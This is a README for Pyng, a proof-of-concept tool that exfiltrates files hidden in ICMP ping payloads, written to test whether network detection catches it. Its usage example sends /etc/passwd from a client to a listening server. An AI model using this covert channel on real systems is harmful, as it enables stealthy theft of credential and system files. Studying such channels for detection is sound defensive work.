# Pyng - ICMP file transfer

Pyng provides a client-server pair for file transfer over ICMP echo requests.  

The Pyng client reads a local file, splits it into 16 byte chunks and injects each chunk into the payload of an ICMP echo request sent to the Pyng server. The Pyng server listens for echo requests, parses their payloads and extracts the original file.

## Why?

PoC of simple data exfiltration techniques that you might not be detecting on. The 16-byte limit means Pyng is slow and resource hungry as hell but it also makes Pyng's pings the same length as ping's pings, requiring that little bit of extra effort in your detection rules.

## Install

Pyng is built for Python 3.8 and up using only the standard library - no external packages are required. Both the client and server are standalone. All you need are the `pyng_cl.py` and `pyng_sv.py` files.

## Use

| :exclamation:  The pyng server requires root level permissions. Proceed with caution and common sense. |
|-----------------------------------------|

To listen for incoming files, run `sudo ./pyng_sv.py [IP]`. If you do not provide an interface address, Pyng listens on 0.0.0.0 by default :

```sh
~ > sudo ./pyng_sv.py
[*] Pyng server listening on 0.0.0.0
```

To transfer files, run `./pyng_cl.py [SRV_IP] [FILE_PATH]` : 

```sh
$ ./pyng_cl.py 192.168.0.37 /etc/passwd
[+]  Transfer start
[+]  File: /etc/passwd
[+]  Chunks: 207
[+]  Sending: 207 / 207
```

Back on the server, you'll see the transfer information, including the client IP and the file name (local and remote), size and MD5 sum : 

```sh
~ > sudo ./pyng_sv.py 192.168.0.37
[*] Pyng server listening on 192.168.0.37
[*] T1: Start transfer from 192.168.0.102
T1: Complete
T1: Remote:	/etc/passwd
T1: Local:	./pyng_192.168.0.102_1
T1: Size:	3230
T1: MD5:	0039ba53ecf81c2e4eaa50c0beab80cb
```

## Troubleshoot

You need ping installed on the machine running pyng_cl, Pyng does not build its own packets.

The Pyng server does not distinguish between echo requests and responses and will crash if pyng_cl and pyng_sr are ran on the same machine.

The Pyng server waits for magic bytes indicating that the transfer is complete before writing the file to disk ; this means that a lot of data is being stored in process memory when transferring big files. The Pyng client does a similar thing, reading the whole of the target file to process memory in one big gulp. Like I said, PoC, PoC.

Pyng has been tested on two local ubuntu VMs. How does it work on other OSes? What if the ping implementation differs slightly between machines? I don't know, do let me know.

Pyng has crappy performance and eats cpu cycles - it's a python script calling subprocess.Run, not sure what you we're expecting in terms of performance.

## Credits

Pyng is inspired by a Python ping sweeper presented in Justin Seitz and Tim Arnold's book [Black Hat Python](https://nostarch.com/black-hat-python2E).